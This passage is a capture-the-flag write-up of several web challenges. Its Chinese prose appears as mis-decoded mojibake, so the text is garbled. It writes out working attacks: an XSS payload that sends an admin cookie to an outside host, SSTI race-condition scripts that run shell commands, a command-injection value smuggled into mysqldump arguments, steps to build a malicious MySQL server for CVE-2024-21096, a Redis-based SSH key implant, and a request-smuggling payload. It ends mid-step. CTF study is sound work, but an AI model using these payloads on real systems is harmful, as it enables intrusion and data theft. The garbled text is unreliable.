å¯†ç çˆ†ç ´ï¼ŒXSS cookieçªƒå–\nçˆ†å‡ºæ¥ shallot/888888\nç™»è¿›å»çœ‹åˆ°ä¸€ä¸ªç•™è¨€æ¿\nçŒœæµ‹æ˜¯xssï¼Œæµ‹è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; åŒæ—¶é€šè¿‡dirsearchæ‰«åˆ°äº†/adminè·¯ç”±\næ ¹æ®è¿™å¥è¯å¤§æ¦‚å¯ä»¥çŒœåˆ°ï¼Œè®¿é—®/adminè·¯ç”±çš„æ—¶å€™åº”è¯¥ä¼šåœ¨åç«¯ä»¥adminçš„èº«ä»½æ¥è®¿é—®ç•™è¨€æ¿\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡Œcookieçªƒå–\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; å°†payloadè¾“å‡ºåœ¨ç•™è¨€æ¿ï¼Œç„¶åè®¿é—®/admin\næˆåŠŸæ‹¿åˆ°adminçš„cookie\næ‹¿adminçš„cookieè®¿é—®/flagå³å¯æ‹¿åˆ°flag\nLevel 25 åŒé¢äººæ´¾å¯¹ è¿™é“é¢˜æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯reï¼Œå…¶å®æ„Ÿè§‰æ›´åƒæ˜¯misc\nè®¿é—®app.service-webå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmainæ–‡ä»¶\næ˜¯ä¸€ä¸ªelfæ–‡ä»¶\nç”¨exeinfo PEæŸ¥åˆ°ç”¨upxåŠ å£³äº†\nç”¨upxå®˜æ–¹å·¥å…·å°±å¯ä»¥è„±å£³\nhttps://github.com/upx/upx/releases/latest\nè„±å£³ä¹‹åç”¨idaæ‰“å¼€\nå¯ä»¥æ‰¾åˆ°ä¸€æ®µå…³äºminioçš„å¯†é’¥ä¿¡æ¯\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; é‚£æˆ‘ä»¬å¤§æ¦‚å°±èƒ½çŒœåˆ°å¦ä¸€ä¸ªç¯å¢ƒåº”è¯¥å°±æ˜¯è¿™ä¸ªminioçš„æœåŠ¡\nç”¨mcé€šè¿‡Access Keyå’ŒSecret Keyè¿æ¥ä¸Šå»\né‡Œé¢æœ‰ä¸¤ä¸ªå‚¨å­˜æ¡¶\nå°†ä¸¤ä¸ªå‚¨å­˜æ¡¶éƒ½ä¸‹è½½ä¸‹æ¥\n/hintsé‡Œé¢æ”¾çš„æ˜¯8080æœåŠ¡çš„æºç ï¼Œ/prodbucketé‡Œé¢æ˜¯æºç ç¼–è¯‘åçš„æ–‡ä»¶å«åšupdateï¼ŒçŒœæµ‹æ˜¯çƒ­æ›´æ–°\nçœ‹ä¸€ä¸‹æºç \n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} æˆ‘ä»¬å¯ä»¥çŒœæµ‹/è·¯ç”±å±•ç¤ºçš„è¿™ä¸ª.ç›®å½•å°±æ˜¯å‰é¢æˆ‘ä»¬ä¸‹å‘¨mainæ–‡ä»¶çš„ç›®å½•\næˆ‘ä»¬å¯ä»¥æŠŠ.æ”¹æˆæ ¹ç›®å½•/ï¼Œç„¶åå°†ç¼–è¯‘åçš„æºç è¦†å†™æ‰åŸæ¥çš„updateï¼Œçƒ­æ›´æ–°åï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥è®¿é—®æ ¹ç›®å½•äº†\npayload:\npackage main\rimport (\r\u0026#34;level25/fetch\u0026#34;\r\u0026#34;level25/conf\u0026#34;\r\u0026#34;github.com/gin-gonic/gin\u0026#34;\r\u0026#34;github.com/jpillora/overseer\u0026#34;\r)\rfunc main() {\rfetcher := \u0026amp;fetch.MinioFetcher{\rBucket: conf.MinioBucket,\rKey: conf.MinioKey,\rEndpoint: conf.MinioEndpoint,\rAccessKey: conf.MinioAccessKey,\rSecretKey: conf.MinioSecretKey,\r}\roverseer.Run(overseer.Config{\rProgram: program,\rFetcher: fetcher,\r})\r}\rfunc program(state overseer.State) {\rg := gin.Default()\rg.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true))\rg.Run(\u0026#34;:8080\u0026#34;)\r} è¿™é‡Œæˆ‘å°†/è·¯ç”±æ”¹æˆäº†/abcï¼Œå› ä¸ºä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨/è·¯ç”±ä¸è¡Œ\nå°†æºç ç¼–è¯‘åè¦†å†™åˆ°å‚¨å­˜æ¡¶ä¸Š\nè®¿é—®/abc\næ‹¿åˆ°flag\nLevel 38475 è§’è½ ssti/æ¡ä»¶ç«äº‰\n/robots.txtæœ‰ä¸ª/app.conf\nè®¿é—®/app.conf\nè¿™é‡Œå±•ç¤ºäº†httpd.confçš„ç‰‡æ®µ\nè¿™é‡Œç»™å‡ºäº†æºç çš„ä½ç½®è¿˜æœ‰ä¸€ä¸ªé‡å†™å¼•æ“çš„è§„åˆ™ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯¥ç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²\nåŒæ—¶åœ¨å“åº”æ ‡å¤´èƒ½æ‰¾åˆ°Apacheçš„ç‰ˆæœ¬ä¿¡æ¯\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„apacheå­˜åœ¨æºç æ³„éœ²ï¼Œè€Œä¸”æ˜¯è·Ÿé‡å†™è§„åˆ™æœ‰å…³\nCVE-2024-38475\nç½‘ä¸Šæ²¡æ‰¾åˆ°ä»€ä¹ˆpoc\nä½†æ˜¯å¯ä»¥æ‰¾åˆ°æ¼æ´å‘ç°è€…çš„ä¸€ç¯‡æ–‡ç« \nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\næ ¹æ®è¿™ç¯‡æ–‡ç« æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºpaylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F è¿™é“é¢˜å¤šäº†ä¸€ä¸ªRewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;ï¼Œåªéœ€è¦åœ¨user-agentå‰é¢åŠ ä¸ŠL1nk/å³å¯\næ‹¿åˆ°æºç \n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) å¯ä»¥çœ‹åˆ°/readè·¯ç”±å­˜åœ¨sstiï¼Œä½†æ˜¯ä»–wafæ‰äº†æœ€é‡è¦çš„{\nä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿™ä¸ª/sendè·¯ç”±ä¼šå°†ä¼ å…¥çš„ä¿¡æ¯å†™å…¥message.txtæ–‡ä»¶ï¼Œåœ¨è®¿é—®/readè·¯ç”±çš„æ—¶å€™åˆ™ä¼šè¯»å–message.txtæ–‡ä»¶ã€‚è¿™ä¹ˆä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘é€šè¿‡ç«äº‰çš„æ–¹å¼æ¥ç»•è¿‡wafäº†ã€‚ç«äº‰æ€è·¯å¤§æ¦‚å°±æ˜¯æˆ‘åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¿ç»­å‘é€ä¸¤æ¡ä¿¡æ¯ï¼Œç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯åˆæ³•ä¿¡æ¯ï¼Œè€Œç¬¬äºŒæ¡ä¿¡æ¯æ˜¯ä¸åˆæ³•çš„ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ä¸€ç§æƒ…å†µï¼Œå½“ç¬¬ä¸€æ¡ä¿¡æ¯é€šè¿‡äº†åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥è¦å°†æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“çš„æ—¶å€™ï¼Œåˆšå¥½ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯è¦†å†™äº†message.txtï¼Œé‚£ä¹ˆæ’å…¥æ¨¡æ¿ä¸­çš„å°±æ˜¯ç¬¬äºŒæ¡ä¸åˆæ³•çš„ä¿¡æ¯äº†\næ¥ä¸‹æ¥å°±æ˜¯æ“è„šæœ¬å‘åŒ…\nä¸‰ä¸ªè„šæœ¬\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break æˆåŠŸæ‰§è¡Œï¼Œæ‹¿åˆ°flag\nweek2 week2å¼ºåº¦æœ‰ç‚¹é«˜ï¼Œå°±æ‰“äº†ä¸€é“HoneyPotï¼Œå¤ç°ä¸€æ‰‹\nLevel 21096 HoneyPot åº”è¯¥æ˜¯éé¢„æœŸ\nå¯ä»¥æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯/api/importï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‹¼æ¥\n1func ImportData(c *gin.Context) { 2 var config ImportConfig 3 if err := c.ShouldBindJSON(\u0026amp;config); err != nil { 4 c.JSON(http.StatusBadRequest, gin.H{ 5 \u0026#34;success\u0026#34;: false, 6 \u0026#34;message\u0026#34;: \u0026#34;Invalid request body: \u0026#34; + err.Error(), 7 }) 8 return 9 } 10 if err := validateImportConfig(config); err != nil { 11 c.JSON(http.StatusBadRequest, gin.H{ 12 \u0026#34;success\u0026#34;: false, 13 \u0026#34;message\u0026#34;: \u0026#34;Invalid input: \u0026#34; + err.Error(), 14 }) 15 return 16 } 17 18 config.RemoteHost = sanitizeInput(config.RemoteHost) 19 config.RemoteUsername = sanitizeInput(config.RemoteUsername) 20 config.RemoteDatabase = sanitizeInput(config.RemoteDatabase) 21 config.LocalDatabase = sanitizeInput(config.LocalDatabase) 22 if manager.db == nil { 23 dsn := buildDSN(localConfig) 24 db, err := sql.Open(\u0026#34;mysql\u0026#34;, dsn) 25 if err != nil { 26 c.JSON(http.StatusInternalServerError, gin.H{ 27 \u0026#34;success\u0026#34;: false, 28 \u0026#34;message\u0026#34;: \u0026#34;Failed to connect to local database: \u0026#34; + err.Error(), 29 }) 30 return 31 } 32 33 if err := db.Ping(); err != nil { 34 db.Close() 35 c.JSON(http.StatusInternalServerError, gin.H{ 36 \u0026#34;success\u0026#34;: false, 37 \u0026#34;message\u0026#34;: \u0026#34;Failed to ping local database: \u0026#34; + err.Error(), 38 }) 39 return 40 } 41 42 manager.db = db 43 } 44 if err := createdb(config.LocalDatabase); err != nil { 45 c.JSON(http.StatusInternalServerError, gin.H{ 46 \u0026#34;success\u0026#34;: false, 47 \u0026#34;message\u0026#34;: \u0026#34;Failed to create local database: \u0026#34; + err.Error(), 48 }) 49 return 50 } 51 //Never able to inject shell commands,Hackers can\u0026#39;t use this,HaHa 52 command := fmt.Sprintf(\u0026#34;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s\u0026#34;, 53 config.RemoteHost, 54 config.RemoteUsername, 55 config.RemotePassword, 56 config.RemoteDatabase, 57 localConfig.Username, 58 localConfig.Password, 59 config.LocalDatabase, 60 ) 61 fmt.Println(command) 62 cmd := exec.Command(\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, command) 63 if err := cmd.Run(); err != nil { 64 c.JSON(http.StatusInternalServerError, gin.H{ 65 \u0026#34;success\u0026#34;: false, 66 \u0026#34;message\u0026#34;: \u0026#34;Failed to import data: \u0026#34; + err.Error(), 67 }) 68 return 69 } 70 71 c.JSON(http.StatusOK, gin.H{ 72 \u0026#34;success\u0026#34;: true, 73 \u0026#34;message\u0026#34;: \u0026#34;Data imported successfully\u0026#34;, 74 }) 75} Payload\n1{\u0026#34;remote_host\u0026#34;:\u0026#34;127.0.0.1\u0026#34;,\u0026#34;remote_port\u0026#34;:\u0026#34;3306\u0026#34;,\u0026#34;remote_username\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;remote_password\u0026#34;:\u0026#34;123456;/writeflag;#\u0026#34;,\u0026#34;remote_database\u0026#34;:\u0026#34;123\u0026#34;,\u0026#34;local_database\u0026#34;:\u0026#34;123\u0026#34;} è®¿é—®/flagæ‹¿åˆ°flag\nLevel 21096 HoneyPot_Revenge [CVE-2024-21096 mysqldumpå‘½ä»¤æ³¨å…¥æ¼æ´ç®€æ | Ec3o](https://tech.ec3o.fun/2024/10/25/Web-Vulnerability Reproduction/CVE-2024-21096/)\nå‡ºé¢˜äººçš„åšå®¢æœ‰å†™è¿‡è¿™ä¸ªçŸ¥è¯†ç‚¹\nç¼–è¯‘æ¶æ„Mysql å®‰è£…ç¼–è¯‘ä¾èµ–\nsudo apt-get update\rsudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config\rwget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz\rtar -zxvf mysql-boost-8.0.34.tar.gz\rcd mysql-8.0.34 ä¿®æ”¹æ¨¡æ¿æ–‡ä»¶/include/mysql_version.h.in\nvim include/mysql_version.h.in /* Copyright Abandoned 1996,1999 TCX DataKonsult AB \u0026amp; Monty Program KB\r\u0026amp; Detron HB, 1996, 1999-2004, 2007 MySQL AB.\rThis file is public domain and comes with NO WARRANTY of any kind\r*/\r/* Version numbers for protocol \u0026amp; mysqld */\r#ifndef _mysql_version_h\r#define _mysql_version_h\r#define PROTOCOL_VERSION @PROTOCOL_VERSION@\r#define MYSQL_SERVER_VERSION \u0026#34;8.0.0-injection-test\\n\\\\! /writeflag\u0026#34;\r#define MYSQL_BASE_VERSION \u0026#34;mysqld-8.0.34\u0026#34;\r#define MYSQL_SERVER_SUFFIX_DEF \u0026#34;@MYSQL_SERVER_SUFFIX@\u0026#34;\r#define MYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#define MYSQL_PORT @MYSQL_TCP_PORT@\r#define MYSQL_ADMIN_PORT @MYSQL_ADMIN_TCP_PORT@\r#define MYSQL_PORT_DEFAULT @MYSQL_TCP_PORT_DEFAULT@\r#define MYSQL_UNIX_ADDR \u0026#34;@MYSQL_UNIX_ADDR@\u0026#34;\r#define MYSQL_CONFIG_NAME \u0026#34;my\u0026#34;\r#define MYSQL_PERSIST_CONFIG_NAME \u0026#34;mysqld-auto\u0026#34;\r#define MYSQL_COMPILATION_COMMENT \u0026#34;@COMPILATION_COMMENT@\u0026#34;\r#define MYSQL_COMPILATION_COMMENT_SERVER \u0026#34;@COMPILATION_COMMENT_SERVER@\u0026#34;\r#define LIBMYSQL_VERSION \u0026#34;8.0.34-custom\u0026#34;\r#define LIBMYSQL_VERSION_ID @MYSQL_VERSION_ID@\r#ifndef LICENSE\r#define LICENSE GPL\r#endif /* LICENSE */\r#endif /* _mysql_version_h */ æ‰§è¡Œå‘½ä»¤çš„ä½ç½®ä¸º\n#define MYSQL_SERVER_VERSION \u0026#34;8.0.0-injection-test\\n\\\\! /writeflag\u0026#34; ä¿®æ”¹æˆè¦æ‰§è¡Œçš„å‘½ä»¤ä¹‹åï¼Œå¼€å§‹ç¼–è¯‘\nmkdir build\rcd build\rcmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost\rmake -j$(nproc) æˆ‘çš„æœåŠ¡å™¨å¤ªçƒ‚äº†ï¼Œç¼–è¯‘äº†äº”ä¸ªå°æ—¶è¿˜ç¼–è¯‘å¤±è´¥äº†\næ‰€ä»¥åé¢åœ¨æœ¬åœ°ç”¨wslç¼–è¯‘å®Œåå†ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š\næœ¬åœ°ç¼–è¯‘çš„æ—¶å€™æœ€å¥½ä½¿ç”¨ä¸æœåŠ¡å™¨ç›¸åŒçš„è·¯å¾„\nä¸ç„¶installçš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œå¾ˆéº»çƒ¦\nåŠ ä¸‹æ¥åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…ç¼–è¯‘å¥½çš„mysql\nå®‰è£…\nsudo make install åˆ›å»ºâ½¤â¼¾ç»„\nsudo groupadd mysql\rsudo useradd -r -g mysql -s /bin/false mysql åˆå§‹åŒ–\nsudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --\rbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data åˆå§‹åŒ–ä¿¡æ¯\nbasedir=/usr/local/mysql --datadir=/usr/local/mysql/data\r2025-02-20T16:35:47.430647Z 0 [System] [MY-013169] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.0.0-injection-test \\! /writeflag) initializing of server in progress as process 557354\r2025-02-20T16:35:47.483565Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.\r2025-02-20T16:35:48.220016Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.\r2025-02-20T16:35:51.634311Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: #fq;t8\u0026lt;;j5AH\r-bash: --datadir=/usr/local/mysql/data: No such file or directory è®¾ç½®â½¬å½•æƒé™\nsudo chown -R mysql:mysql /usr/local/mysql\rsudo chown -R mysql:mysql /usr/local/mysql/data å¯åŠ¨æœåŠ¡\nsudo /usr/local/mysql/bin/mysqld_safe --user=mysql \u0026amp; ç™»å½•\n/usr/local/mysql/bin/mysql -u root -p ä¿®æ”¹å¯†ç \nALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39;; ç”±äºéœ€è¦è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œéœ€è¦é…ç½®rootç™»å½•æ”¯æŒ\nCREATE USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;password\u0026#39;; //åˆ›å»ºç”¨æˆ·\rGRANT ALL PRIVILEGES ON *.* TO \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39;; //æˆäºˆæƒé™\rFLUSH PRIVILEGES; åˆ›å»ºæ•°æ®åº“\nCREATE DATABASE test;\rEXIT; æ¥ä¸‹æ¥å°±å¯ä»¥å»å¯¼å…¥æ•°æ®äº†\nè®¿é—®/flag,æ‹¿åˆ°flag\nLevel 60 SignInJava è¿™ä¸ªæ˜¯çœŸä¸æ‡‚ğŸ˜¥ï¼Œç­‰åé¢å†hui\u0026rsquo;tou\nLevel 111 ä¸å­˜åœ¨çš„è½¦å¢ è¿™æ˜¯ä¸€é“å…³äºæ•´æ•°æº¢å‡ºæ‰“åè®®â¾›ç§çš„é¢˜ç›®\né¢˜ç›®ç»™å‡ºçš„webæœåŠ¡â¾ƒå®šä¹‰äº†â¼€ä¸ªH111åè®®ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªè‡ªå®šä¹‰åè®®ä¸­çš„æ‰€æœ‰Lengthå­—æ®µå‡ä¸ºuint16ç±»å‹(0~65535)ï¼Œè€Œä¸”æ²¡æœ‰åšä»»ä½•çš„é•¿åº¦é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´å­˜åœ¨æ•´æ•°æº¢å‡º\nè€Œä¸”è¿™ä¸ªåè®®æ˜¯æ”¯æŒè¿æ¥å¤ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯åŒä¸€TCPè¿æ¥å¯å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚ç¬¬ä¸€ä¸ªè¯·æ±‚å‘ç”Ÿæº¢å‡ºåï¼Œæ®‹ç•™æ•°æ®ä¸åç»­è¯·æ±‚æ··åˆåï¼ŒæœåŠ¡ç«¯ä¼šé”™è¯¯è§£æåˆ°æˆ‘ä»¬ç¬¬äºŒä¸ªè¯·æ±‚ï¼Œä»â½½â¾›ç§è¿›ç¬¬â¼†ä¸ªè¯·æ±‚ã€‚\nå®˜æ–¹wpæ˜¯è¿™ä¹ˆè¯´çš„ï¼š\nå¼€å§‹å¤ç°\nå…ˆç¼–å†™â¼€æ®µæµ‹è¯•ï¼Œæ”¾åœ¨protocol/request_test.goï¼Œé€šè¿‡go test -v -run TestGenRequestæ‹¿åˆ°è¾“å‡º\n1package protocol 2 3import ( 4\t\u0026#34;bytes\u0026#34; 5\t\u0026#34;encoding/hex\u0026#34; 6\t\u0026#34;net/http\u0026#34; 7\t\u0026#34;testing\u0026#34; 8) 9 10 11func TestGenRequest(t *testing.T) { 12\tvar buf bytes.Buffer 13\terr := WriteH111Request(\u0026amp;buf, \u0026amp;http.Request{ 14\tMethod: \u0026#34;POST\u0026#34;, 15\tRequestURI: \u0026#34;/flag\u0026#34;, 16\t}) 17\tif err != nil { 18\tt.Fatalf(\u0026#34;expected no error, got %v\u0026#34;, err) 19\t} 20\tt.Log(len(buf.Bytes())) 21\tt.Log(hex.EncodeToString(buf.Bytes())) 22} ç”¨WriteH111Requeståºåˆ—åŒ–ä¸€ä¸ªPOST /flagè¯·æ±‚\nåºåˆ—åŒ–åçš„åå…­è¿›åˆ¶æ•°æ®\n0004504f535400052f666c616700000000 åœ¨è¿™æ®µæ•°æ®åâ¾¯è¡¥â»¬0ï¼Œè¡¥â»¬åˆ°65536ï¼Œäº§â½£Lengthæº¢å‡º\npayload:\nGET / HTTP/1.1\rHost: node1.hgame.vidar.club:30529\r{{hexdec(0004504f535400052f666c616700000000)}}{{padding:zero(0|65519)}} Level 257 â½‡è½çš„ç´«ç½—å…° é¢˜â½¬ç«¯â¼ä¸ºsshæœåŠ¡å’ŒredisæœåŠ¡\né¦–å…ˆä½¿ç”¨ ssh-keygen ç”Ÿæˆå¯†é’¥å¯¹\nssh-keygen -t rsa æŠŠç”Ÿæˆçš„å…¬é’¥æ·»åŠ åˆ° spaced_key.txt æ–‡ä»¶é‡Œ\n(echo -e â€œ\\n\\nâ€; cat /root/.ssh/id_rsa.pub; echo -e â€œ\\n\\nâ€) \u0026gt; spaced_key.txt åˆ©ç”¨ Redis æœåŠ¡å†™å…¥ SSH å…¬é’¥\ncat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30428 -x set ssh_key\rredis-cli -h node1.hgame.vidar.club -p 30428 redis-cli -h node1.hgame.vidar.club -p 30428\rnode1.hgame.vidar.club:30428\u0026gt; config set dir /home/mysid/.ssh\rOK\rnode1.hgame.vidar.club:30428\u0026gt; config set dbfilename \u0026#34;authorized_keys\u0026#34;\rOK\rnode1.hgame.vidar.club:30428\u0026gt; save\rOK\rnode1.hgame.vidar.club:30428\u0026gt; exit user.txté‡Œé¢æœ‰sshçš„ç”¨æˆ·å\nè¿ssh\nssh -i /root/.ssh/id_rsa mysid@node1.hgame.vidar.club -p 31266 è¦ææƒ\nè¿™é¢˜ç”¨çš„æ˜¯ä¸Šä¼ 